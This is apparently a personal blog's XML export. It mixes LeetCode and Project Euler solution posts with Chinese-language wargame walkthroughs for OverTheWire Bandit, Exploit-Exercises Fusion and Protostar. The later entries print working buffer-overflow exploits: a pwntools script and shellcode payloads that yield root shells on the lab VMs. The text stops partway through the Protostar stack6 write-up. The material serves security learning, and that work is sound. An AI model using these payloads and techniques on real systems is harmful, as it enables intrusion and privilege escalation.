Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546extern crate num_bigint;extern crate num_traits;use num_bigint::&#123;BigUint&#125;;use num_traits::&#123;Zero&#125;;use std::mem::replace;fn main() &#123; println!("Used for don't need to delete it...&#123;&#125;", fib(2)); println!("Used for don't need to delete it...&#123;&#125;", fibonacci_recursive(2)); let mut x0: u64 = 0; let mut x1: u64 = 2; let mut x2: u64; let mut sum: u64 = 0; while x1 &lt;= 4000000 &#123; x2 = x0 + 4*x1; x0 = x1; x1 = x2; sum += x0; &#125; println!("The answer is &#123;&#125;", sum);&#125;// Implication using bigint, but its so slow...fn fib(n: usize) -&gt; BigUint &#123; let mut f0: BigUint = Zero::zero(); let mut f1: BigUint = BigUint::parse_bytes(b"2", 10).unwrap(); let four: BigUint = BigUint::parse_bytes(b"4", 10).unwrap(); let mut f2: BigUint; for _ in 0..n &#123; f2 = f0 + &amp;four * &amp;f1; // This is a low cost way of swapping f0 with f1 and f1 with f2. f0 = replace(&amp;mut f1, f2); &#125; f0&#125;fn fibonacci_recursive(n: u64) -&gt; u64 &#123; let mut x0: u64 = 0; let mut x1: u64 = 1; for _ in 0..n&#123; x1 = x0 + x1; x0 = x1 - x0; &#125; x0&#125; AlgorithmProblem123456789101112131415161718192021786. K-th Smallest Prime FractionA sorted list A contains 1, plus some number of primes. Then, for every p &lt; q in the list, we consider the fraction p/q.What is the K-th smallest fraction considered? Return your answer as an array of ints, where answer[0] = p and answer[1] = q.Examples:Input: A = [1, 2, 3, 5], K = 3Output: [2, 5]Explanation:The fractions to be considered in sorted order are:1/5, 1/3, 2/5, 1/2, 3/5, 2/3.The third fraction is 2/5.Input: A = [1, 7], K = 1Output: [1, 7]Note:A will have length between 2 and 2000.Each A[i] will be between 1 and 30000.K will be between 1 and A.length * (A.length - 1) / 2. SolutionI think that avoiding computation of fractions is impossible. So time complexity is at least $O(n^2)$. And I remembered algorithm that find k-th element with idea of quick sort. But I&#39;m wondering if JavaScript is quick enough to get me a AC? OK, when I spent my half day fight with JS and I got a MLE...... Such a depressive experience...... So I change my implication to cpp and use STL TAT But I&#39;ll upload my JS code, just for……my wasted time. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** * @param &#123;number[]&#125; A * @param &#123;number&#125; K * @return &#123;number[]&#125; */var kthSmallestPrimeFraction = (A, K) =&gt; &#123; let arr = []; let indexarr = []; let i = 0; for(const value1 of A)&#123; for(const value2 of A)&#123; if(value2 == value1) break; arr.push([value2/value1, value2, value1]); indexarr.push(i); i += 1; &#125; &#125; let findkth = (A, bg, ed, K) =&gt; &#123; let p = partition(A, bg, ed); if(p == K-1) return A[p]; else if(p &lt; K-1) return findkth(A, p+1, ed, K); else return findkth(A, bg, p-1, K); &#125;; let partition = (A, bg, ed) =&gt; &#123; let pivot = arr[A[bg]]; let i = bg + 1; let j = ed; while(true)&#123; while(arr[A[i]] &lt; pivot &amp;&amp; i &lt;= ed) ++i; while(arr[A[j]] &gt; pivot &amp;&amp; j &gt; bg) --j; if(i &gt; j) break; [A[i], A[j]] = [A[j], A[i]]; ++i; --j; &#125; [A[bg], A[j]] = [A[j], A[bg]]; return j; &#125;; // console.log(indexarr); // console.log(arr); // console.log(i); let a = findkth(indexarr,0,i-1,K); // console.log(arr[a]); return [arr[a][1], arr[a][2]];&#125;;// console.log(kthSmallestPrimeFraction([1,2,3,5],3));// console.log(kthSmallestPrimeFraction([1,7],1)); 1234567891011121314151617181920212223242526272829303132struct s &#123; double val; int up; int dn; bool operator &lt; (const s &amp; b) &#123; return val &lt; b.val; &#125;&#125;v[2000000];class Solution &#123; public: vector &lt; int &gt; kthSmallestPrimeFraction(vector &lt; int &gt; &amp; A, int K) &#123; vector &lt; int &gt; ans; int cnt = 0; for (int i = 1; i &lt; A.size(); ++i) &#123; for (int j = 0; j &lt; i; ++j) &#123; v[cnt].val = 1.0 * A[j] / A[i]; v[cnt].up = A[j]; v[cnt].dn = A[i]; ++cnt; &#125; &#125; nth_element(v, v + K - 1, v + cnt); // for(int i=0;i&lt;v.size();++i)&#123; // cout&lt;&lt;v[i].up&lt;&lt;" "&lt;&lt;v[i].dn&lt;&lt;endl; // &#125; ans.push_back(v[K - 1].up); ans.push_back(v[K - 1].dn); return ans; &#125;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
        <tag>Fibonacci</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-21 Daily Challenge]]></title>
    <url>%2F2018-12-21-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I’ve done today is Multiples of 3 and 5 in Rust and Max Chunks To Make Sorted in JavaScript. MathProblem1234567Multiples of 3 and 5Problem 1 If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples is 23.Find the sum of all the multiples of 3 or 5 below 1000. SolutionOne way to do it is brute force method, this range is small enough. Another way to do it is to come up with a formula which can compute the multiples of a number in constant time, then we should use Inclusion–exclusion principle to get the final answer. I&#39;ll show you both ways in Rust. Implementation123456789101112131415161718192021222324252627282930313233use std::io;fn main() &#123; let mut range = String::new(); io::stdin().read_line(&amp;mut range) .expect("Failed to read line"); let range: i32 = match range.trim().parse()&#123; Ok(num) =&gt; num, Err(_) =&gt; 0, &#125;; println!("&#123;&#125;", multiples_of_3_and_5(range - 1)); println!("&#123;&#125;", multiples_of_3_and_5_brute(range - 1));&#125;fn multiples_of_a_number(n: i32, d: i32) -&gt; i32 &#123; (n / d * d + d) * (n / d) / 2&#125;fn multiples_of_3_and_5(n: i32) -&gt; i32 &#123; multiples_of_a_number(n, 3) + multiples_of_a_number(n, 5) - multiples_of_a_number(n, 15)&#125;fn multiples_of_3_and_5_brute(n: i32) -&gt; i32 &#123; let mut ans = 0; for x in 1..n+1 &#123; if x%3 == 0 || x%5==0 &#123; ans += x; &#125; &#125; ans&#125; AlgorithmProblem123456789101112131415161718192021222324769. Max Chunks To Make SortedGiven an array arr that is a permutation of [0, 1, ..., arr.length - 1], we split the array into some number of &quot;chunks&quot; (partitions), and individually sort each chunk. After concatenating them, the result equals the sorted array.What is the most number of chunks we could have made?Example 1:Input: arr = [4,3,2,1,0]Output: 1Explanation:Splitting into two or more chunks will not return the required result.For example, splitting into [4, 3], [2, 1, 0] will result in [3, 4, 0, 1, 2], which isn&apos;t sorted.Example 2:Input: arr = [1,0,2,3,4]Output: 4Explanation:We can split into two chunks, such as [1, 0], [2, 3, 4].However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible.Note:arr will have length in range [1, 10].arr[i] will be a permutation of [0, 1, ..., arr.length - 1]. Solution ImplementationI come up with an awkward implication: 12345678910111213141516171819202122/** * @param &#123;number[]&#125; arr * @return &#123;number&#125; */var maxChunksToSorted = (arr) =&gt; &#123; let count = 0; let mx; let el = false; for(const [index, value] of arr.entries())&#123; if(!el &amp;&amp; index == value) count += 1; else if (!el) &#123; el = true; mx = value; &#125;else if (value &gt; mx)&#123; mx = value; &#125;else if(mx == index)&#123; count +=1; el = false; &#125; &#125; return count;&#125;; And got 1A. I&#39;m very happy but when I check the solution page I find a more gentle implication. When there is a maintained max indicate the situation, there is no way find a index equal max, but the range [i: max] doesn&#39;t meet the criteria. So I improved my implication and beat 100% online submissions, what a cheerful thing!!! 12345678910111213/** * @param &#123;number[]&#125; arr * @return &#123;number&#125; */var maxChunksToSorted = (arr) =&gt; &#123; let count = 0; let mx = -1; for(const [index, value] of arr.entries())&#123; mx = (mx &gt; value)? mx : value; if(mx == index) ++count; &#125; return count;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
        <tag>Division</tag>
        <tag>Inclusion–exclusionPrinciple</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-20 Daily Challenge]]></title>
    <url>%2F2018-12-20-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Secret Messages of Number Theory and Course Schedule II in JavaScript. Due to the high cost of [brilliant.org]&#39;s subscription, and low difficulty, I decide to change to https://projecteuler.net. So again, if there is no source provided, I&#39;m doing challenge with it and https://LeetCode.com Math Ha, Caesar cipher! Dr. Smith. Emmmm...... ...... &quot;like&quot; is &quot;dip&quot;, &quot;cats&quot; is &quot;sip&quot;, &quot;parrots&quot; is &quot;tif&quot;, apples is &quot;nit&quot;, &quot;don&#39;t&quot; is &quot;rit&quot;. Fence cipher. AlgorithmProblem123456789101112131415161718192021222324252627210. Course Schedule IIThere are a total of n courses you have to take, labeled from 0 to n-1.Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1]Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses.There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array.Example 1:Input: 2, [[1,0]] Output: [0,1]Explanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1] .Example 2:Input: 4, [[1,0],[2,0],[3,1],[3,2]]Output: [0,1,2,3] or [0,2,1,3]Explanation: There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is [0,2,1,3] .Note:The input prerequisites is a graph represented by a list of edges, not adjacency matrices. Read more about how a graph is represented.You may assume that there are no duplicate edges in the input prerequisites. SolutionJust do a topological sort. Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243/** * @param &#123;number&#125; numCourses * @param &#123;number[][]&#125; prerequisites * @return &#123;number[]&#125; */var findOrder = (numCourses, prerequisites) =&gt; &#123; let iDegree = []; let iG = []; let queue = []; let ans = []; for(let i = 0; i &lt; numCourses ; ++i)&#123; iDegree.push(0); iG.push([]); &#125; for(const i of prerequisites)&#123; iDegree[i[0]] += 1; iG[i[1]].push(i[0]); &#125; // console.log(iG); // console.log(iDegree); for(const [index, value] of iDegree.entries())&#123; if(value == 0) &#123; queue.push(index); &#125; &#125; console.log(queue); while(queue.length)&#123; let i = queue.shift(); ans.push(i); for(const j of iG[i])&#123; iDegree[j] -= 1; if(!iDegree[j])&#123; queue.push(j); &#125; &#125; &#125; return ans.length == numCourses? ans:[];&#125;;// console.log(findOrder(2, [[0,1]]));// console.log(findOrder(2, [[1,0]]));// console.log(findOrder(4, [[1,0],[2,0],[3,1],[3,2]]));// console.log(findOrder(3, [[1,0],[1,2],[0,1]]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>NumberTheory</tag>
        <tag>Brilliant</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-19 Daily Challenge]]></title>
    <url>%2F2018-12-19-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Last Digits of Number Theory and Longest Substring Without Repeating Characters in JavaScript. If no source is provided, then I&#39;m doing these challenge at https://brilliant.org and https://leetcode.com/. Math On the first view of problem, there comes the answer is three. Five times an even number is zero, whatever number time zero is zero. Five times an odd number is five. Obviously there is loop (2-&gt;4-&gt;8-&gt;6) in the multiply chain. So obvious~ AlgorithmProblem12345678910111213141516171819203. Longest Substring Without Repeating CharactersGiven a string, find the length of the longest substring without repeating characters.Example 1:Input: &quot;abcabcbb&quot;Output: 3 Explanation: The answer is &quot;abc&quot;, with the length of 3. Example 2:Input: &quot;bbbbb&quot;Output: 1Explanation: The answer is &quot;b&quot;, with the length of 1.Example 3:Input: &quot;pwwkew&quot;Output: 3Explanation: The answer is &quot;wke&quot;, with the length of 3. Note that the answer must be a substring, &quot;pwke&quot; is a subsequence and not a substring. Solution Implementation12345678910111213141516171819/** * @param &#123;string&#125; s * @return &#123;number&#125; */var lengthOfLongestSubstring = function(s) &#123; let map = new Map(); let lp = 0; let ans = 0; let len = s.length; for(let i = 0; i &lt; len ; ++i)&#123; if(map.has(s[i]) &amp;&amp; lp &lt; map.get(s[i]) + 1) lp = map.get(s[i]) + 1; ans = ans &gt; ( i - lp + 1 ) ? ans : ( i - lp + 1 ); //console.log(ans,lp) map.set(s[i], i); &#125; return ans;&#125;;//console.log(lengthOfLongestSubstring("abba"));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>NumberTheory</tag>
        <tag>Brilliant</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cryptography_Engineering_Exercise]]></title>
    <url>%2FCryptography-Engineering-Exercise%2F</url>
    <content type="text"><![CDATA[Cryptography Engineer在目前看来是一本十分不错的讲密码学的书。既然书名都叫密码学工程了，那就更应该动手做点练习了，这里就是用于存放部分练习以及索引的。 Chapter 1Current Event Exercises这个训练感觉很能提升我的系统意识，所以目前是有一个长期更新的打算，后续看看吧。 Security Review Exercises同上。 General Exercises这里我觉得使用图像会显得更加优雅一些，但是很明显，让我去做那么多树图我也很难受，所以这里使用了graphviz，使用的Roadmap默认情况下不加说明是dot Chapter 2Exercise]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OverTheWire-Bandit全攻略+解析]]></title>
    <url>%2FOverTheWire-Bandit%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Level 0 Level 0 → Level 1 Level 1 → Level 2 Level 2 → Level 3 Level 3 → Level 4 Level 4 → Level 5 Level 5 → Level 6 Level 6 → Level 7 Level 7 → Level 8 Level 8 → Level 9 Level 9 → Level 10 Level 10 → Level 11 Level 11 → Level 12 Level 12 → Level 13 Level 13 → Level 14 Level 14 → Level 15 Level 15 → Level 16 Level 16 → Level 17 Level 17 → Level 18 Level 18 → Level 19 Level 19 → Level 20 Level 20 → Level 21 Level 21 → Level 22 Level 22 → Level 23 Level 23 → Level 24 Level 24 → Level 25 Level 25 → Level 26 Level 26 → Level 27 Level 27 → Level 28 Level 28 → Level 29 Level 29 → Level 30 Level 30 → Level 31 Level 31 → Level 32 Level 32 → Level 33 Level 33 → Level 34 Level 01ssh bandit.labs.overthewire.org -p 2220 -l bandit0 Level 0 → Level 11cat ~/readme Level 1 → Level 21cat ~/- 参考资料http://tldp.org/LDP/abs/html/special-chars.html Level 2 → Level 3这一关其实,,,应该关了tab补全1cat ~/spaces\ in\ this\ filename 或者在windows用命令行的方式也行12cat "/home/bandit2/spaces in this filename"cat "space in this filename Level 3 → Level 41cat ~/inhere/.hidden Level 4 → Level 51i=0; while [ $i -le 9 ]; do file `python -c "print '/home/bandit4/inhere/-file%02d' % $i"`; i=$((i+1)); done Level 5 → Level 6难度不够啊，同大小的就一个...1find . -type f -size 1033c -print | xargs cat 还要过滤的话文件加-perm参数未必有用，目前考虑用ls -l和file命令做。 Level 6 → Level 71find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null | xargs cat 很见鬼的是，-print后面放哪些东西会出问题... Level 7 → Level 81cat ~/data.txt | grep millionth Level 8 → Level 91sort ~/data.txt | uniq -u Level 9 → Level 101strings ~/data.txt | grep == Level 10 → Level 111base64 -d ~/data.txt Level 11 → Level 121cat ~/data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' Level 12 → Level 131xxd -r ~/data.txt | gzip -d - | bzip2 -d - | gzip -d - | tar -xOf - | tar -xOf - | bzip2 -d - | tar -xOf - | gzip -d - Level 13 → Level 14Level 14 → Level 15Level 15 → Level 16Level 16 → Level 17Level 17 → Level 18Level 18 → Level 19Level 19 → Level 20Level 20 → Level 21Level 21 → Level 22Level 22 → Level 23Level 23 → Level 24Level 24 → Level 25Level 25 → Level 26Level 26 → Level 27Level 27 → Level 28Level 28 → Level 29Level 29 → Level 30Level 30 → Level 31Level 31 → Level 32Level 32 → Level 33Level 33 → Level 34]]></content>
      <categories>
        <category>WARGAME</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Notes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exploit-Exercise_Fusion全攻略+解析]]></title>
    <url>%2FExploit-Exercise-Fusion%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[目前进度： Level 00 Level 01 Level 02 Level 03 Level 04 Level 05 Level 06 Level 07 Level 08 Level 09 Level 10 Level 11 Level 12 Level 13 Level 14 Level 00123456789101112131415#!/usr/bin/pythonfrom pwn import *import structshellcode = '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'prefix='GET 'postfix=' HTTP/1.1' r=remote('192.168.116.150', 20000)r.recvuntil('er is at')addr=int(r.recv()[0:11],16)#print addr,hex(addr)print hex(addr+200)r.sendline(prefix+'G'*139+p32(addr+200)+postfix+'\x90'*100+shellcode)r.interactive() 123456root@kali:~/Documents/Fusion# ./level00.py [+] Opening connection to 192.168.116.150 on port 20000: Done0xbffff9c0[*] Switching to interactive mode$ iduid=20000 gid=20000 groups=20000]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>WARGAME</tag>
        <tag>PWN</tag>
        <tag>stackoverflow</tag>
        <tag>mitigation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exploit-Exercise_Protostar全攻略+解析]]></title>
    <url>%2FExploit-Exercise-Protostar%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[目前进度： Stack 0 Stack 1 Stack 2 Stack 3 小结一：C/C++程序中的栈 Stack 4 小结二：EIP能好怎 Stack 5 小结三：shellcode Stack 6 Stack 7 Format 0 Format 1 Format 2 Format 3 Format 4 小结四：格式化字符串 Heap 0 Heap 1 Heap 2 Heap 3 Net 0 Net 1 Net 2 Final 0 Final 1 Final 2 Stack 012$ python -c "print 'a'*65" | ./stack0you have changed the 'modified' variable Stack 112$ python -c "print 'a'*64+'dcba'" | xargs ./stack1you have correctly got the variable to the right value Stack 21GREENIE=`python -c "print 'a'*64+'\x0a\x0d\x0a\x0d'"` ./stack2 Stack 312345678910(gdb) disas winDump of assembler code for function win:0x08048424 &lt;win+0&gt;: push %ebp0x08048425 &lt;win+1&gt;: mov %esp,%ebp0x08048427 &lt;win+3&gt;: sub $0x18,%esp0x0804842a &lt;win+6&gt;: movl $0x8048540,(%esp)0x08048431 &lt;win+13&gt;: call 0x8048360 &lt;puts@plt&gt;0x08048436 &lt;win+18&gt;: leave0x08048437 &lt;win+19&gt;: retEnd of assembler dump. 123$ python -c "print 'a'*64+'\x23\x84\x04\x08'" | ./stack3calling function pointer, jumping to 0x08048423code flow successfully changed Stack 412345678910111213141516171819202122(gdb) disas mainDump of assembler code for function main:0x08048408 &lt;main+0&gt;: push %ebp0x08048409 &lt;main+1&gt;: mov %esp,%ebp0x0804840b &lt;main+3&gt;: and $0xfffffff0,%esp0x0804840e &lt;main+6&gt;: sub $0x50,%esp0x08048411 &lt;main+9&gt;: lea 0x10(%esp),%eax0x08048415 &lt;main+13&gt;: mov %eax,(%esp)0x08048418 &lt;main+16&gt;: call 0x804830c &lt;gets@plt&gt;0x0804841d &lt;main+21&gt;: leave0x0804841e &lt;main+22&gt;: retEnd of assembler dump.(gdb) disas winDump of assembler code for function win:0x080483f4 &lt;win+0&gt;: push %ebp0x080483f5 &lt;win+1&gt;: mov %esp,%ebp0x080483f7 &lt;win+3&gt;: sub $0x18,%esp0x080483fa &lt;win+6&gt;: movl $0x80484e0,(%esp)0x08048401 &lt;win+13&gt;: call 0x804832c &lt;puts@plt&gt;0x08048406 &lt;win+18&gt;: leave0x08048407 &lt;win+19&gt;: retEnd of assembler dump. 1234567891011echo "s='a'*64\nfor i in range(0, 26):\n s += chr(ord('a')+i)\nprint s" | python### run with this pattern input(gdb) r &lt; ~/stack4.txtStarting program: /opt/protostar/bin/stack4 &lt; ~/stack4.txtProgram received signal SIGSEGV, Segmentation fault.0x706f6e6d in ?? ()#That's what we need###$ python -c "print 'a'*0x4c+'\xf4\x83\x04\x08'" | ./stack4code flow successfully changedSegmentation fault Stack 512345$ (python -c "print '\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80'+ (76-37)*'a'+'\xa0\xfc\xff\xbf'"; cat) | ./stack5iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)whoamiroot 1(python -c "print '\x89\xe5\xdb\xd2\xd9\x75\xf4\x59\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x41\x41'+(76-68)*'a'+'\xa0\xfc\xff\xbf'"; cat) | ./stack5 12345$ (python -c "print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(76-29)*'\xcc'+'\xa0\xfc\xff\xbf'"; cat) | ./stack5iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)whoamiroot 12$ (python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\xcc"*(76-34) + "\xa0\xfc\xff\xbf"'; cat) | ./stack5Owned!!! Stack 6solution 1: Duplicated Shellcode1234$ python -c "print 'b'*80" |./stack6input path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbinput path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ▒Segmentation fault (core dumped) 这时在dump出来的文件里可以发现输入的东西在别处出现了 12345$ (python -c "print '\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80'+ (80-37)*'a'+'\x00\xe0\xfd\xb7'"; cat) | ./stack6input path please: got path 1▒▒▒RRRT[S_▒/bin▒G//sh@u▒;1ɰ ̀aaaaaaaaaaaaaaaaaaaaaaaaaaaiduid =1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) 12345$ (python -c "print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\x00\xe0\xfd\xb7'"; cat) | ./stack6input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒ 1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) 寻根究底123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051$ python -c "print 'b'*80" |ltrace -S ./stack6 | grep b7fdSYS_brk(NULL) = 0x0804a000SYS_fcntl64(0, 1, 0, 0, 0xb7ffeff4) = 0SYS_fcntl64(1, 1, 0, 1, 0xb7ffeff4) = 0SYS_fcntl64(2, 1, 0, 2, 0xb7ffeff4) = 0SYS_access("/etc/suid-debug", 00) = -2SYS_access("/etc/ld.so.nohwcap", 00) = -2SYS_mmap2(0, 8192, 3, 34, -1) = 0xb7fe0000SYS_access("/etc/ld.so.preload", 04) = -2SYS_open("/etc/ld.so.cache", 0, 00) = 3SYS_fstat64(3, 0xbffff6d4, 0xb7ffeff4, 0xb7fff87c, 3) = 0SYS_mmap2(0, 13796, 1, 2, 3) = 0xb7fdc000SYS_close(3) = 0SYS_access("/etc/ld.so.nohwcap", 00) = -2SYS_open("/lib/libc.so.6", 0, 00) = 3SYS_read(3, "\177ELF\001\001\001", 512) = 512SYS_fstat64(3, 0xbffff720, 0xb7ffeff4, 0xb7fdf21d, 0x8048268) = 0SYS_mmap2(0, 0x144948, 5, 2050, 3) = 0xb7e97000SYS_mprotect(0xb7fd5000, 4096, 0) = 0SYS_mmap2(0xb7fd6000, 12288, 3, 2066, 3) = 0xb7fd6000SYS_mmap2(0xb7fd9000, 10568, 3, 50, -1) = 0xb7fd9000SYS_close(3) = 0SYS_mmap2(0, 4096, 3, 34, -1) = 0xb7e96000SYS_set_thread_area(0xbffffbc0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = 0SYS_mprotect(0xb7fd6000, 8192, 1) = 0SYS_mprotect(0xb7ffe000, 4096, 1) = 0SYS_munmap(0xb7fdc000, 13796) = 0__libc_start_main(0x80484fa, 1, 0xbffffd94, 0x8048520, 0x8048510 &lt;unfinished ...&gt;printf("input path please: " &lt;unfinished ...&gt;SYS_fstat64(1, 0xbffff604, 0xb7fd7ff4, 0xb7fd84c0, 0x80485d0) = 0SYS_mmap2(0, 4096, 3, 34, -1) = 0xb7fdf000&lt;... printf resumed&gt; ) = 19fflush(0xb7fd84c0 &lt;unfinished ...&gt;SYS_write(1, "input path please: ", 19) = 19&lt;... fflush resumed&gt; ) = 0gets(0xbffffc8c, 0, 0xb7fe1b28, 1, 0 &lt;unfinished ...&gt;SYS_fstat64(0, 0xbffffb5c, 0xb7fd7ff4, 0xb7fd8420, 0xb7fd8420) = 0SYS_mmap2(0, 4096, 3, 34, -1) = 0xb7fde000SYS_read(0, "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"..., 4096) = 81&lt;... gets resumed&gt; ) = 0xbffffc8cprintf("got path %s\n", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"...) = 74printf("input path please: ") = 19fflush(0xb7fd84c0 &lt;unfinished ...&gt;SYS_write(1, "got path bbbbbbbbbbbbbbbbbbbbbbb"..., 93) = 93&lt;... fflush resumed&gt; ) = 0gets(0xbffffc8c, 0xbffffc8c, 0xb7fe1b28, 1, 0 &lt;unfinished ...&gt;SYS_read(0, "", 4096) = 0&lt;... gets resumed&gt; ) = 0printf("got path %s\n", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"...) = 98--- SIGSEGV (Segmentation fault) ---+++ killed by SIGSEGV +++ solution 2: Return to .text12345$ (python -c "print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\xf9\x84\x04\x08'+'\x7c\xfc\xff\xbf'"; cat) | ./stack6input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒ 1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) 后来发现这个payload是不能复用的，猜测是因为栈地址会变化的原因 solution 3: Return to libc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354(gdb) disas mainDump of assembler code for function main:0x080484fa &lt;main+0&gt;: push %ebp0x080484fb &lt;main+1&gt;: mov %esp,%ebp0x080484fd &lt;main+3&gt;: and $0xfffffff0,%esp0x08048500 &lt;main+6&gt;: call 0x8048484 &lt;getpath&gt;0x08048505 &lt;main+11&gt;: mov %ebp,%esp0x08048507 &lt;main+13&gt;: pop %ebp0x08048508 &lt;main+14&gt;: retEnd of assembler dump.(gdb) b *0x80484fdBreakpoint 1 at 0x80484fd: file stack6/stack6.c, line 26.(gdb) rStarting program: /opt/protostar/bin/stack6Breakpoint 1, 0x080484fd in main (argc=1, argv=0xbffffd54) at stack6/stack6.c:2626 stack6/stack6.c: No such file or directory. in stack6/stack6.c(gdb) p system$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ecffb0 &lt;__libc_system&gt;(gdb) p exit$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ec60c0 &lt;*__GI_exit&gt;(gdb) info proc mapprocess 16347cmdline = '/opt/protostar/bin/stack6'cwd = '/opt/protostar/bin'exe = '/opt/protostar/bin/stack6'Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 